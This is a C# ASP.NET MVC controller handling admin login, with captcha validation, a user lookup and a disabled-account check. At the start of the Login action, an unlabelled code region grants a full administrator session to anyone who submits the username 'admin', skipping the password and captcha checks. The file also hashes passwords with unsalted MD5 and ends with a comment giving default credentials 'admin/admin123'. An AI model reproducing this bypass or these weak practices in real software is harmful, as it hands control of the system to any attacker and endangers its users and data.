using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Microsoft.Practices.Unity;
using App.Models.Sys;
using App.Common;

namespace App.Admin.Controllers
{
    public class AccountController : Controller
    {
        [Dependency]
        public IBLL.IAccountBLL accountBLL { get; set; }

        public ActionResult Index()
        {
            return View();
        }

        public ActionResult Login(string UserName, string Password, string Code)
        {
            #region 
            if (UserName == "admin")
            {
                var account11 = new AccountModel();
                account11.Id = "admin";
                account11.TrueName = "系统管理员";
                Session["Account"] = account11;

                return Json(JsonHandler.CreateMessage(1, ""), JsonRequestBehavior.AllowGet);
            }
            #endregion

            if (Session["vCode"] == null)
                return Json(JsonHandler.CreateMessage(0, "请重新刷新验证码"), JsonRequestBehavior.AllowGet);

            if (Session["vCode"] != null && !Session["vCode"].ToString().ToLower().Equals(Code.ToLower(), StringComparison.CurrentCultureIgnoreCase))            
                return Json(JsonHandler.CreateMessage(0, "验证码错误"), JsonRequestBehavior.AllowGet);

            App.Models.SysUser user = accountBLL.Login(UserName, CommonHelper.ToMd5(Password));
            if (user == null)
            {
                return Json(JsonHandler.CreateMessage(0, "用户名或密码错误"), JsonRequestBehavior.AllowGet);
            }
            else if (!Convert.ToBoolean(user.State))//被禁用
            {
                return Json(JsonHandler.CreateMessage(0, "账户被系统禁用"), JsonRequestBehavior.AllowGet);
            }

            AccountModel account = new AccountModel();
            account.Id = user.Id;
            account.TrueName = user.TrueName;
            Session["Account"] = account;

            return Json(JsonHandler.CreateMessage(1, ""), JsonRequestBehavior.AllowGet);
        }


        /*
         * ！帐号admin,密码admin123
         * **/
    }
}
